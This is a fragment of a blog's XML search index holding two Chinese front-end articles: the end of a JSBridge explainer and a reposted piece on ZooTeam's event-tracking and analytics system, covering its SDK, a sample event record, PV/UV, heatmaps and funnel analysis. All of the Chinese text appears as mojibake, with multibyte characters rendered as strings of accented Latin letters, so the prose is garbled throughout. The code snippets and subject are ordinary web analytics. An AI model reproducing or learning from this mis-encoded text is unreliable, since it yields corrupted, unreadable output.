å…¶ä½™ç§ç±»çš„é”™è¯¯ä¿¡æ¯äº¤ç”±å…·ä½“çš„ä¸šåŠ¡å»å¤„ç† fn &amp;&amp; fn((err) =&gt; &#123; vm.$dialog.alert(&#123; message: &quot;è¯·æ›´æ–°åˆ°æœ€æ–° APP ä½¿ç”¨è¯¥åŠŸèƒ½&quot;, &#125;); &#125;); &#125; &#125;&#125; æ€»ç»“ä¸Šè¿°å†…å®¹ç®€è¦ä»‹ç»äº† JSBridge çš„éƒ¨åˆ†åŸç†ï¼Œå¸Œæœ›å¯¹ä»æœªäº†è§£è¿‡ JSBridge çš„åŒå­¦èƒ½æœ‰æ‰€å¸®åŠ©ã€‚å¦‚æœéœ€è¦æ›´æ·±å…¥çš„äº†è§£ JSBridge çš„åŸç†å’Œå®ç°ï¼Œå¦‚ JSBridge æ¥å£è°ƒç”¨çš„å°è£…å®ç°ï¼ŒJS è°ƒç”¨ Native æ—¶çš„å›è°ƒçš„å”¯ä¸€æ€§ç­‰ã€‚å¤§å®¶å¯ä»¥å»æŸ¥é˜…æ›´å¤šèµ„æ–™ï¼Œå‚è€ƒæ›´è¯¦ç»†çš„ç›¸å…³æ–‡æ¡£æˆ–ä»–äººçš„æ•´ç†æˆæ–‡çš„æ²‰æ·€ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å·¥ç¨‹å®è·µä¹‹æ•°æ®åŸ‹ç‚¹åˆ†æç³»ç»Ÿï¼ˆä¸€ï¼‰]]></title>
    <url>%2F2020%2F02%2F24%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%9F%8B%E7%82%B9%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5e3fb599f265da573f3563b9 èƒŒæ™¯éšç€å…¬å¸ä¸šåŠ¡çš„ä¸æ–­å¢é•¿ï¼Œå¹³å°ä¸šåŠ¡çš„ä¸æ–­å¢åŠ ï¼Œåœºæ™¯å¤æ‚åº¦ä¹Ÿå¯¹åº”çš„æœ‰æ‰€å¢åŠ ã€‚è¿™å¯¹å¹³å°äº§å“çš„ç”¨æˆ·ä½“éªŒï¼Œå•†ä¸šåœºæ™¯çš„æ·±åŒ–è¿è¥ï¼ŒåŠè¿‡ç¨‹ä¸­å¯¹å¹³å°ç”¨æˆ·çš„ä½¿ç”¨ä¾¿æ·æ€§ï¼Œéƒ½å¸¦æ¥äº†ä¸å°çš„å½±å“å’ŒæŒ‘æˆ˜ã€‚ä¸ºæ›´ç²¾å‡†çš„è§¦è¾¾ç”¨æˆ·ç—›ç‚¹ï¼Œå®šä½è½¬åŒ–ä½ç‚¹ï¼Œæå‡ä¸šåŠ¡èµ‹èƒ½ï¼ŒåŸºäºæ•°æ®åˆ†æçš„ä¼˜åŒ–ç­–ç•¥åŠ¿åœ¨å¿…è¡Œã€‚ æ”¿é‡‡äº‘å‰ç«¯å›¢é˜Ÿï¼ˆZooTeamï¼‰ï¼Œä»å»å¹´å¹´åº•å¼€å§‹ï¼Œä¸»åŠ¨ä¸»å¯¼æ¨è¿›å…¬å¸ä¸šåŠ¡å±‚é¢çš„ Web æ•°æ®åŸ‹ç‚¹åŠåˆ†æé‡åŒ–çš„èƒ½åŠ›å»ºè®¾ï¼ˆå†…éƒ¨äº§å“åŒ–å‘½åâ€œæµ‘ä»ªç³»ç»Ÿâ€ï¼‰ã€‚å¸Œæœ›åŸºäºæˆ‘ä»¬è¿‡å»ä¸€æ®µæ—¶é—´çš„äº‹ä»¶å’Œç»éªŒï¼Œèƒ½ä¸ºæ­£æœ‰æ„å®è·µæ­¤æ–¹å‘ä» 0 åˆ° 1 å»ºè®¾çš„å°ä¼™ä¼´ä»¬ï¼Œæä¾›ä¸€äº›æ€è·¯å’Œå¸®åŠ©ã€‚ ç³»ç»Ÿæ¦‚è§ˆæ•°æ®åŸ‹ç‚¹åˆ†æç³»ç»Ÿéƒ½åšäº†äº›ä»€ä¹ˆï¼Ÿé‡‡é›†äº†å“ªäº›æ•°æ®ï¼Ÿè¿™äº›æ•°æ®æˆ‘ä»¬å°†å¦‚ä½•è¿ç”¨å’Œåˆ†æï¼Ÿæœ€ç»ˆåˆå°†å¦‚ä½•å±•ç¤ºå‘¢ï¼Ÿ é¦–å…ˆæˆ‘ä»¬çœ‹ä¸‹ç³»ç»Ÿç»“æ„ã€‚æ•´ä¸ªç³»ç»Ÿç”±ä»¥ä¸‹ 4 ä¸ªéƒ¨åˆ†ç»„æˆï¼ŒæœŸæœ›èƒ½æä¾›ä¸€å¥—å®Œæ•´çš„ç”¨æˆ·è¡Œä¸ºåˆ†æçš„è§£å†³æ–¹æ¡ˆï¼š åŸ‹ç‚¹é‡‡é›† JSSDKï¼šæ”¶é›†ç”¨æˆ·è¡Œä¸ºæ•°æ®ï¼Œå¹¶è¿›è¡Œä¸ŠæŠ¥ï¼› æ•°æ®å¤„ç†æœåŠ¡ï¼šæ¥æ”¶ä¸ŠæŠ¥æ•°æ®å¹¶å­˜å‚¨ï¼›ç­›å–æ‰€éœ€æ•°æ®ï¼Œè¿›è¡Œæ•°æ®å¤„ç†å¹¶é€å‡ºï¼› æ•°æ®å¯è§†åŒ–å¹³å°ï¼šæ±‡æ€»å±•ç¤ºè¯¦ç»†æ•°æ®ï¼Œæ”¯æŒè‡ªå®šä¹‰ï¼Œæ‰“é€šä¸šåŠ¡ï¼› Chromeæ’ä»¶å·¥å…·ï¼šåœ¨é¡µé¢ä¸Šç›´è§‚å±•ç¤ºå‘ä½æ•°æ®ï¼Œæä¾›åœºæ™¯æ›´å‹å¥½çš„æ•°æ®å¯è§†åŒ–æœåŠ¡ï¼› å…¶åŸºæœ¬åä½œæµç¨‹æ˜¯ï¼Œç”¨æˆ·è¿›å…¥å¹³å°ä»»æ„ä¸€ä¸ªå·²åŸ‹ç‚¹çš„ Web é¡µé¢ï¼Œè¿›è¡Œçš„ä¸€ç³»åˆ—ï¼ˆè¿›å…¥ã€ç‚¹å‡»ã€æ»šå±ç­‰ï¼‰æ“ä½œï¼Œéƒ½ä¼šç”± JSSDK è¿›è¡Œåˆ†ç±»å¹¶å°†æ•°æ®ä¸ŠæŠ¥è‡³æœåŠ¡ç«¯è¿›è¡Œå­˜å‚¨ï¼Œå†ç”±ç«™ç‚¹ / æ’ä»¶å‘èµ·æŸ¥è¯¢ï¼ŒæœåŠ¡ç«¯å°†å¤„ç†åçš„æ•°æ®è¿”å›ï¼Œå†é€šè¿‡æ•°æ®å¯è§†åŒ–å¹³å°è¿›è¡Œé€å‡ºå±•ç¤ºã€‚ æ•°æ®é‡‡é›†æ•°æ®é‡‡é›†ä¸€èˆ¬åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ï¼š æ— åŸ‹ç‚¹ï¼ˆå…¨åŸ‹ç‚¹ï¼‰ï¼šé›¶åŸ‹ç‚¹æˆæœ¬ï¼ŒæŠ“å–ç”¨æˆ·è¡Œä¸ºå…¨é‡æ•°æ®ï¼Œä»»ä½•æ“ä½œè¡Œä¸ºéƒ½ä¼šè¢«ä¸Šä¼ ã€‚æ•°æ®é‡å¤§ï¼Œâ€œå™ªéŸ³â€å¤šï¼› å¯è§†åŒ–åŸ‹ç‚¹ï¼šåœ¨é¡µé¢ä¸­æ“ä½œï¼Œé€‰æ‹©åŸ‹ç‚¹ä½ç½®/æ¨¡å—ï¼Œéå¼€å‘äººå‘˜ä¹Ÿå¯ä»¥è¿›è¡ŒåŸ‹ç‚¹ï¼› ä¾µå…¥å¼åŸ‹ç‚¹ï¼šåŸ‹ç‚¹æ—¶éœ€è¦å°†æ•°æ®é‡‡é›†ä»£ç å†™å…¥ä¸šåŠ¡ä»£ç ä¸­ï¼ŒåŸ‹ç‚¹æˆæœ¬è¾ƒé«˜ï¼Œä½†å‡†ç¡®åº¦ä¹Ÿæ›´é«˜ï¼› ç”±äºå¯¹æ•°æ®çš„å‡†ç¡®åº¦è¦æ±‚è¾ƒé«˜ï¼ŒåŒæ—¶å¸Œæœ›å‰æœŸåªæŠ•å…¥è¾ƒå°‘çš„å¼€å‘èµ„æºå°±å¯ä»¥è¿›è¡Œå¿«é€Ÿè¯•é”™ï¼Œå¹¶ä¸ºäº†æ»¡è¶³é‡ç‚¹çš„ç”¨æˆ·è¡Œä¸ºæ•°æ®çš„é‡‡é›†éœ€æ±‚ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬ä¼˜å…ˆé‡‡ç”¨ä»£ç ä¾µå…¥å¼åŸ‹ç‚¹æ–¹æ¡ˆã€‚ åŒæ—¶é’ˆå¯¹å…¶æ¥å…¥æˆæœ¬è¾ƒé«˜çš„åŠ£åŠ¿ï¼Œæˆ‘ä»¬ä¹Ÿå°†åŸ‹ç‚¹åœ¨æ­å»ºç³»ç»ŸåŠç»„ä»¶ä¸­é‡‡ç”¨äº†è‡ªåŠ¨åŒ–çš„æ¤å…¥æ–¹å¼ï¼Œè¿™ç‚¹å°†ä¸å†æ­¤è¯¦è¿°ã€‚ä¸ºé™ä½æ¥å…¥æˆæœ¬å¹¶ä¸”æ›´åŠ çµæ´»çš„æ•è·æ•°æ®ï¼Œæˆ‘ä»¬é‡‡ç”¨äº† DOM èŠ‚ç‚¹æŒ‚è½½ç‰¹æ®Šå±æ€§åè‡ªåŠ¨å‘é€å’Œæ‰‹åŠ¨è‡ªå®šä¹‰å‘é€ä¸¤ç§æ–¹å¼ç»“åˆï¼Œä»¥æ»¡è¶³ä¸åŒåœºæ™¯çš„éœ€è¦ã€‚ 123456789101112//è‡ªåŠ¨å‘é€åŸ‹ç‚¹æ–¹å¼ï¼Œä¸¾ä¾‹ï¼š&lt;button data-utm-click=&quot;$&#123;did&#125;&quot; data-utm-data=&quot;$&#123;ä¸šåŠ¡æ•°æ®&#125;&quot;&gt;//æ‰‹åŠ¨å‘é€åŸ‹ç‚¹æ–¹å¼ï¼Œä¸¾ä¾‹ï¼šconst utmCnt = g_UTM.batchSend(&apos;è§¦å‘ç±»å‹ï¼ˆclick/browseï¼‰ç­‰&apos;,[&#123; utmCD:[&apos;åŒºå—ä¿¡æ¯&apos;,&apos;ä½ç½®ä¿¡æ¯&apos;], bdata:&#123;key:&apos;å…¶ä»–ä¸šåŠ¡æ•°æ®&apos;&#125; &#125;,&#123; utmCD:[&apos;001&apos;,&apos;008&apos;], bdata:&#123;key:&apos;value&apos;&#125; &#125;]);å¤åˆ¶ä»£ç  åŸºäºç”¨æˆ·è¡Œä¸ºåˆ†æè¿™ä¸ªå¤§ç›®æ ‡ï¼Œæˆ‘ä»¬æ‰€é‡‡é›†æ•°æ®ç´§ç´§å›´ç»•ç€ä¸¤ä¸ªä¸»é¢˜ï¼Œå³ï¼šEventï¼ˆäº‹ä»¶/è¡Œä¸ºï¼‰å’Œ Userï¼ˆç”¨æˆ·ï¼‰ã€‚ å›´ç»•â€œäº‹ä»¶â€œæˆ‘ä»¬é‡‡é›†äº†ï¼šäº‹ä»¶çš„ç±»å‹ã€å‘ç”Ÿæ—¶é—´ã€é¡µé¢ä½ç½®ç­‰ä¿¡æ¯ï¼Œç»„æˆäº‹ä»¶å”¯ä¸€æ ‡è¯†ã€‚ å›´ç»•â€ç”¨æˆ·â€œæˆ‘ä»¬é‡‡é›†äº†ï¼šç”¨æˆ· IPã€æ“ä½œç³»ç»Ÿã€æµè§ˆå™¨ä¿¡æ¯ã€å±å¹•åˆ†è¾¨ç‡ç­‰ï¼Œå¹¶ç”Ÿæˆç”¨æˆ·å”¯ä¸€æ ‡è¯†æ¤å…¥ Cookie ä¸­ã€‚ 12345678910111213141516171819&#123; bdata: &#123;&#125;, //ä¸šåŠ¡æ•°æ® createTime: &quot;1571038815128&quot;, // åˆ›å»ºæ—¶é—´ evt: &quot;browse&quot;, // äº‹ä»¶ç±»å‹ ipAddr: 122.226.174.195, //ipåœ°å€ logType: 2, // è§¦å‘ç±»å‹ lver: 1.1.0, //ç‰ˆæœ¬ mx: 0, // é¡µé¢ä½ç½®åæ ‡x my: 0, // é¡µé¢ä½ç½®åæ ‡y os: &quot;Windows/7&quot;, // æ“ä½œç³»ç»Ÿ pre: &quot;https://www.zcygov.cn/&quot;, // æ¥æºåœ°å€ scr: &quot;1920x1360&quot;, // å±å¹•åˆ†è¾¨ç‡ url: &quot;https://www.zcygov.cn/&quot;, // é¡µé¢åœ°å€ userId: &quot;001&quot;, // ç”¨æˆ·æ ‡è¯† utmCnt: &quot;a0004.2ef5001f.0001.0001.d814bf60ee5511e99397b37fe9083257&quot;, // è§¦å‘ä½ç½® utmUrl: &quot;a0004.2ef5001f.0001.0001&quot;, // æ¥æºä½ç½® uuid: &quot;d7fd8de0-ee55-11e9-9397-b37fe9083257&quot;, // æµè§ˆå™¨å”¯ä¸€æ ‡è¯†&#125;å¤åˆ¶ä»£ç  ä¸Šè¿°ä¸€äº›æ”¶é›†çš„å­—æ®µï¼Œä¼šåœ¨ä¸‹é¢æ¡ˆä¾‹ä¸­ä½¿ç”¨åˆ°ã€‚ æ•°æ®å±•ç¤ºç›®å‰å‰å°ç«™ç‚¹å·²ç»æä¾›äº†æ¯”è¾ƒä¸°å¯Œçš„æ•°æ®å±•ç¤ºåŠŸèƒ½ï¼Œæ¯”å¦‚ï¼šPVï¼ˆæµè§ˆæ¬¡æ•°ï¼‰/UVï¼ˆæµè§ˆäººæ•°ï¼‰ æ’åºæˆ–è¶‹åŠ¿ã€æ¼æ–—åˆ†æã€è·¯å¾„åˆ†æã€çƒ­å›¾åˆ†æã€ç”¨æˆ·ç”»åƒã€è‡ªå®šä¹‰çœ‹æ¿ç­‰ç­‰ï¼Œè¿˜æœ‰å„ç§ä¸šåŠ¡ç›¸å…³çš„æ•°æ®ç»Ÿè®¡åŠæŠ¥è¡¨å¯¼å‡ºåŠŸèƒ½ã€‚æ€»ä½“èœå•å¦‚ä¸‹ï¼š PV/UV æ’åºæˆ–è¶‹åŠ¿ï¼ˆPVï¼šPageViewï¼Œé¡µé¢æµè§ˆæ¬¡æ•°ï¼Œç”¨æˆ·æ¯æ‰“å¼€ä¸€æ¬¡è®°å½•ä¸€æ¬¡ï¼Œå¤šæ¬¡æ‰“å¼€åŒä¸€é¡µé¢å°†ç´¯è®¡å¤šæ¬¡ï¼›UVï¼šUserViewï¼Œæµè§ˆé¡µé¢äººæ•°ï¼›ä¸‹æ–‡ä¸­å°†ç›´æ¥ç”¨PV/UVï¼›ï¼‰ å…¨ç«™çš„PV/UVå•æ—¥è¶‹åŠ¿å›¾ï¼šåˆ†æ—¶æ®µæŸ¥çœ‹è®¿é—®é‡çš„é«˜å³°å’Œä½è°·ï¼› PV/UVæ’åºï¼šæŸ¥çœ‹Topé¡µé¢çš„PV/UV æŒ‰é¡µé¢ã€æ—¶é—´åŒºé—´æŸ¥è¯¢PV/UV æ¼æ–—åˆ†æï¼šæŒ‰æµç¨‹æ’åºæ¯ä¸ªé˜¶æ®µçš„äººæ•°ï¼Œè®¡ç®—å‡ºè½¬åŒ–ç‡ï¼› è·¯å¾„åˆ†æï¼šæŸ¥è¯¢å„ä¸ªé¡µé¢çš„æ¥æºå’Œå»å‘ï¼› çƒ­å›¾åˆ†æ ç‚¹å‡»çƒ­å›¾ï¼šæŒ‰é’®åŠé“¾æ¥ç‚¹å‡»çš„çƒ­å›¾ï¼› æ»šå±çƒ­å›¾ï¼ˆå³å°†ä¸Šçº¿ï¼‰ï¼šç”¨æˆ·é¡µé¢æ»šå±è§¦è¾¾ç‡ï¼› ç”¨æˆ·ç”»åƒï¼ˆå³å°†ä¸Šçº¿ï¼‰ï¼šé’ˆå¯¹é‡ç‚¹ç”¨æˆ·çš„å›è®¿æ¬¡æ•°ã€æµè§ˆè·¯å¾„ã€ç”¨æˆ·èº«ä»½ã€æ‰€åœ¨åœ°ã€æ“ä½œç³»ç»Ÿã€æµè§ˆå™¨ç­‰è¯¦ç»†ä¿¡æ¯æŸ¥è¯¢ï¼› è‡ªå®šä¹‰çœ‹æ¿ï¼šå¯é€‰æ‹©é¦–é¡µçœ‹æ¿çš„å±•ç¤ºé¡¹ï¼› èµ‹èƒ½ä¸šåŠ¡é‡‡é›†å’Œåˆ†æå“ªäº›æ•°æ®æ‰æ˜¯å¯¹ä¸šåŠ¡æœ‰ä»·å€¼çš„ï¼Œæˆ‘ä»¬å‚è€ƒäº†è®¸å¤šä¸šç•Œæˆç†Ÿçš„ç”¨æˆ·è¡Œä¸ºåˆ†æè§£å†³æ–¹æ¡ˆï¼ŒåŒ…æ‹¬ï¼š GrowingIO ç¥ç­–æ•°æ® æ•°æå®¢ è¿™äº›äº§å“åœ¨ç”¨æˆ·è¡Œä¸ºåˆ†æä¾§çš„åŠŸèƒ½å¯ä»¥è¯´æ˜¯åšåˆ°äº†å¤§è€Œå…¨ã€‚æ ¹æ®æˆ‘ä»¬çš„å®é™…éœ€æ±‚å¯ä»¥ç­›é€‰å‡ºä»¥ä¸‹ä¸€äº›é‡ç‚¹åŠŸèƒ½æ¨¡å—ï¼š å…³é”®åŠŸèƒ½ç‚¹ æ•°æå®¢ ç¥ç­–æ•°æ® GrowingIO è‡ªç ”ç³»ç»Ÿ è¡¨å•åˆ†æ æ”¯æŒ æ”¯æŒ æ”¯æŒ ä¸æ”¯æŒ é¡µé¢åˆ†æ æ”¯æŒ æ”¯æŒ æ”¯æŒ æ”¯æŒ è·¯å¾„åˆ†æ æ”¯æŒ æ”¯æŒ æ”¯æŒ æ”¯æŒ æ¼æ–—åˆ†æ æ”¯æŒ æ”¯æŒ æ”¯æŒ æ”¯æŒ äº‹ä»¶åˆ†æ æ”¯æŒ æ”¯æŒ æ”¯æŒ æ”¯æŒ äº‹ä»¶åˆ†å¸ƒåˆ†æ æ”¯æŒ æ”¯æŒ æ”¯æŒ æ”¯æŒ ç”¨æˆ·åˆ†ç¾¤ æ”¯æŒ æ”¯æŒ æ”¯æŒ æ”¯æŒ è¡Œä¸ºé¢„æµ‹ ä¸æ”¯æŒ æ”¯æŒ ä¸æ”¯æŒ ä¸æ”¯æŒ ç”¨æˆ·è¡Œä¸ºåºåˆ— ä¸æ”¯æŒ æ”¯æŒ ä¸æ”¯æŒ ä¸æ”¯æŒ çƒ­å›¾ æ”¯æŒ æ”¯æŒ æ”¯æŒ æ”¯æŒ è§†é¢‘å›æ”¾ æ”¯æŒ ä¸æ”¯æŒ ä¸æ”¯æŒ ä¸æ”¯æŒ ä¸Šé¢å¤§éƒ¨åˆ†ä¸€æ”¯æŒçš„åŠŸèƒ½éƒ½å¯ä»¥åœ¨ã€æ•°æ®å±•ç¤ºã€‘æ¨¡å—ä¸­æŸ¥çœ‹ï¼Œè¡¨å•åˆ†æåŠç”¨æˆ·è¡Œä¸ºåºåˆ—ç›®å‰å·²åœ¨æˆ‘ä»¬ç‰ˆæœ¬çš„è§„åˆ’ä¸­ã€‚è¡¨å•åˆ†ææ˜¯åˆ†æä¸€ä¸ªç”¨æˆ·ä»è¿›å…¥ä¸€ä¸ªè¡¨å•å¡«å†™é¡µé¢åˆ°è¡¨å•æäº¤çš„è¿‡ç¨‹ä¸­å„ä¸ªè¡Œä¸ºçš„åˆ†æï¼Œæ¯ä¸ªè¡¨å•é¡¹çš„å¡«å†™ç‡ã€é‡å¡«ç‡ã€å¡«å†™æ—¶é•¿ã€æ”¾å¼ƒç‡ç­‰éƒ½æ˜¯é‡è¦çš„åˆ†ææŒ‡æ ‡ï¼Œä¼šç›´æ¥å½±å“åˆ°æ•´ä½“çš„è½¬åŒ–ç‡ã€‚ä¹Ÿèƒ½å¸®åŠ©å¼€å‘äººå‘˜åŠæ—¶å‘ç°å’Œå®šä½è¡¨å•é¡µé¢ä¸­çš„äº¤äº’é—®é¢˜ï¼Œä»è€Œæå‡ç”¨æˆ·ä½“éªŒï¼Œå’Œé‡è¦é“¾è·¯ä¸­çš„è½¬åŒ–ç‡ã€‚ ä¾‹å¦‚ï¼šå¸¸è§çš„æ³¨å†Œè¡¨å•çš„è½¬åŒ–ï¼Œå³ 10 ä¸ªç”¨æˆ·è¿›å…¥æ³¨å†Œé¡µé¢ä½†æœ€ååªæœ‰ 7 ä¸ªç”¨æˆ·æˆåŠŸæ³¨å†Œï¼Œè¿™ä¸ªåŠŸèƒ½å¯ä»¥æœ‰æ•ˆå‘æ˜å‰©ä½™ 3 ä¸ªæ³¨å†Œå¤±è´¥çš„ç”¨æˆ·æµå¤±çš„ç‚¹ï¼Œæ‰¾åˆ°ä»–ä»¬æ˜¯åœ¨å¡«å†™å“ªä¸ªè¡¨å•é¡¹å‰ç¦»å¼€é¡µé¢æˆ–æ˜¯æ‰¾åˆ°é‡å¡«ç‡æœ€é«˜çš„è¡¨å•é¡¹è¿›è¡Œä¼˜åŒ–ã€‚ç”¨æˆ·è¡Œä¸ºåºåˆ—æ˜¯ä»å•ä¸€ç”¨æˆ·çš„è§’åº¦å»æŸ¥çœ‹åœ¨æˆ‘ä»¬ç«™ç‚¹ä¸Šçš„è¡Œä¸ºè½¨è¿¹ï¼Œä»è€Œå»åˆ†æé‡ç‚¹ç”¨æˆ·çš„è¡Œä¸ºå–œå¥½ã€‚ åŸºäºå…¬å¸å½“å‰çš„ä¸šåŠ¡å‘å±•ï¼Œé™¤äº†ä¸Šè¿°åŸºç¡€åŠŸèƒ½æ¨¡å—å¤–ï¼Œç³»ç»Ÿä¸­è¿˜ä¼šå¯¹åº”è€ƒè™‘ä¸€äº›å®šåˆ¶åŒ–çš„ä¸šåŠ¡èƒ½åŠ›æ¨¡å—ã€‚ä¾æ®ç›®å‰ç³»ç»Ÿçš„èƒ½åŠ›ç±»å‹ï¼Œå¯åˆ†ä¸ºç”¨æˆ·è¡Œä¸ºåˆ†æã€é“¾è·¯è½¬åŒ–åˆ†æã€ç”¨æˆ·ä½“éªŒåˆ†æç­‰ï¼š æœç´¢æµç¨‹åŸ‹ç‚¹æ¡ˆä¾‹é‚£ä¹ˆåœ¨ä¸€ä¸ªé¡µé¢æˆ–è€…ä¸€ä¸ªæµç¨‹ä¸­æˆ‘ä»¬å¯ä»¥é‡‡é›†åˆ°å“ªäº›æœ‰ä»·å€¼çš„æ•°æ®å‘¢ï¼Ÿä¸‹é¢æˆ‘ä»¬å°±ä»¥ä¸€ä¸ªç®€å•çš„æµç¨‹ä¸ºä¾‹æ¥è¯´æ˜ã€‚ è¿™é‡Œæµç¨‹å¯ä»¥åˆ†ä¸ºä¸‰æ­¥ï¼Œé¦–å…ˆï¼Œç”¨æˆ·è¿›å…¥æ”¿é‡‡äº‘ç”µå­å–åœºé¦–é¡µï¼Œå¹¶åœ¨æœç´¢æ¡†ä¸­è¾“å…¥æƒ³è¦æœç´¢çš„å…³é”®è¯ï¼Œå…¶æ¬¡ï¼Œç‚¹å‡»æœç´¢æŒ‰é’®åè¿›å…¥æœç´¢ç»“æœé¡µï¼Œæœ€åï¼Œåœ¨ç»“æœé¡µä¸­æ‰¾åˆ°äº†ç›®æ ‡å•†å“å¹¶ç‚¹å‡»è¿›å»äº†å•†å“è¯¦æƒ…é¡µæŸ¥çœ‹ã€‚è¿™æ˜¯åœ¨ä¸€ä¸ªç”µå•†å¹³å°ä¸­ç”¨æˆ·æ“ä½œè¡Œä¸ºä¸­è¾ƒä¸ºå¸¸è§çš„ä¸€ç§æµç¨‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå…³é”®æµç¨‹ã€‚ æˆ‘ä»¬åœ¨ä¸Šè¿°çš„ä¸‰ä¸ªé¡µé¢ä¸­ä¼šé‡‡é›†çš„æ•°æ®æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š é¡µé¢è¿›å…¥/ç¦»å¼€è‡ªåŠ¨åŸ‹ç‚¹ æŒ‰é’®ç‚¹å‡»åŸ‹ç‚¹ é“¾æ¥ç‚¹å‡»åŸ‹ç‚¹ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé€šè¿‡ Chrome æ’ä»¶å·¥å…·ï¼Œå¯ä»¥åœ¨é¡µé¢ä¸Šç›´è§‚çš„å±•ç¤ºé“¾æ¥å’ŒæŒ‰é’®çš„ç‚¹å‡»æ¬¡æ•°ï¼ˆæ•°æ®å·²è„±æ•ï¼‰ã€‚ åˆ©ç”¨ä¸Šé¢è¯´åˆ°çš„ä¸‰é¡¹åŸ‹ç‚¹ï¼Œæˆ‘ä»¬åœ¨å•ä¸ªé¡µé¢ä¸­å¯ä»¥å¾—åˆ°ç”¨æˆ·è¡Œä¸ºç›¸å…³çš„å››ç§æ•°æ®ã€‚ PVï¼šé€šè¿‡è®¡ç®—æ—¥å¿—ä¸­æ‰€æœ‰è¿›å…¥é¡µé¢æ—¥å¿—æ¡æ•°çš„æ€»å’Œæˆ‘ä»¬å¯ä»¥å¾—åˆ° pv UVï¼šä»¥å”¯ä¸€ uuid å°† pv è¿›è¡Œè¿‡æ»¤åå¯ä»¥å¾—åˆ° uv ï¼› æŒ‰é’®ç‚¹å‡»æ•°ï¼šç›´æ¥é€šè¿‡ç»Ÿè®¡æŒ‰é’®ç‚¹å‡»äº‹ä»¶ä¸ŠæŠ¥çš„æ—¥å¿—æ¡æ•°å¯ä»¥å¾—åˆ°æŒ‰é’®çš„ç‚¹å‡»é‡ï¼› é“¾æ¥ç‚¹å‡»æ•°ï¼šä¸æŒ‰é’®ç‚¹å‡»æœ‰æ‰€ä¸åŒï¼ŒæŒ‰é’®ç‚¹å‡»æ˜¯é€šè¿‡å•ç‹¬å‘é€çš„ç‚¹å‡»äº‹ä»¶ä¸ŠæŠ¥æ¥è¿›è¡Œç»Ÿè®¡ï¼Œè€Œé“¾æ¥ç‚¹å‡»å¾€å¾€å¯¼è‡´çš„æ˜¯ä¸€æ¬¡é¡µé¢è·³è½¬ï¼Œæ­¤å¤„å³ä¸ºä»ç”µå­å–åœºé¦–é¡µç¦»å¼€è¿›å…¥äº†æœç´¢ç»“æœé¡µï¼Œæ­¤æ—¶æˆ‘ä»¬æ‰€ç»Ÿè®¡çš„å°±æ˜¯æœç´¢ç»“æœé¡µçš„é¡µé¢è¿›å…¥äº‹ä»¶ä¸­çš„ utmUrlï¼ˆå³æ¥æºæŒ‰é’®çš„å”¯ä¸€è¯†åˆ«ç ï¼‰å€¼ï¼Œåˆ¤æ–­å‡ºè¯¥æ¬¡æœç´¢ç»“æœé¡µçš„è¿›å…¥æ˜¯æ¥æºäºé¦–é¡µå¸¸è§æœç´¢å…³é”®è¯çš„ç‚¹å‡»ï¼Œä»è€Œç»Ÿè®¡å‡ºè¯¥ä½ç½®çš„çš„é“¾æ¥ç‚¹å‡»é‡ã€‚ å†å¯¹è¿™äº›æ•°æ®è¿›è¡ŒåŠ å·¥ï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥å¯ä»¥å¾—åˆ°ï¼šåœç•™æ—¶é•¿ã€è½¬åŒ–ç‡ã€çƒ­åŠ›å›¾ï¼› çƒ­åŠ›å›¾ï¼šç”¨äºåæ˜ å›¾ä¸­ç‚¹çš„å¯†é›†ç¨‹åº¦ï¼Œåœ¨æ­¤å¤„æˆ‘ä»¬åˆ©ç”¨ç‚¹å‡»çš„åæ ‡ï¼ˆç‚¹å‡»çš„ x,y åæ ‡ä½ç½®ï¼Œå†æ ¹æ®å±å¹•åˆ†è¾¨ç‡åšä¸€è‡´æ€§çš„æ¢ç®—ï¼‰ç»„åˆæˆç‚¹å‡»çƒ­å›¾ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆæ•°æ®å·²è„±æ•ï¼‰ã€‚ æ¼æ–—åˆ†æï¼šç”±ä¸€ä¸ªå…ƒäº‹ä»¶/è™šæ‹Ÿäº‹ä»¶åŠ ä¸€ä¸ªæˆ–è€…å¤šä¸ªç­›é€‰æ¡ä»¶ç»„æˆï¼Œè¡¨ç¤ºä¸€ä¸ªè½¬åŒ–æµç¨‹ä¸­çš„ä¸€ä¸ªå…³é”®æ€§çš„æ­¥éª¤ï¼›åœ¨æˆ‘ä»¬å¹³å°ä¸Šåˆ›å»ºä¸€ä¸ªæ¼æ–—ä¸»è¦ç”±ä»¥ä¸‹å‡ æ­¥ï¼š å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåœ¨è¿™ä¸ªæ¼æ–—ä¸­å®šä¹‰äº†ä¸‰ä¸ªäº‹ä»¶ã€‚ å°†è¿™ä¸‰ä¸ªäº‹ä»¶ä¸²è”èµ·æ¥ï¼Œå¯ä»¥å¾—åˆ°å®Œæ•´çš„æ¼æ–—åˆ†æå›¾ï¼ˆæ•°æ®å·²è„±æ•ï¼‰ã€‚ æ€»ç»“æœ¬æ–‡åªæ˜¯å¯¹é€šç”¨ç±»å‹çš„æ•°æ®åŸ‹ç‚¹ä¸åˆ†æç³»ç»Ÿåšäº†ä¸‹åˆæ­¥çš„èƒ½åŠ›é¡¹ä»‹ç»ï¼Œåç»­æˆ‘ä»¬å°†é’ˆå¯¹æ¯ä¸ªè¸©è¿‡çš„å‘å’Œåšè¿‡çš„ä¼˜åŒ–äº§å‡ºä¸€ç³»åˆ—çš„æ–‡ç« ï¼Œå¸Œæœ›å„ä½èƒ½ç»™äºˆæ„è§ã€‚ ã€Šå¦‚ä½•é«˜æ•ˆå®Œæ•´çš„é‡‡é›†æ•°æ®ã€‹ 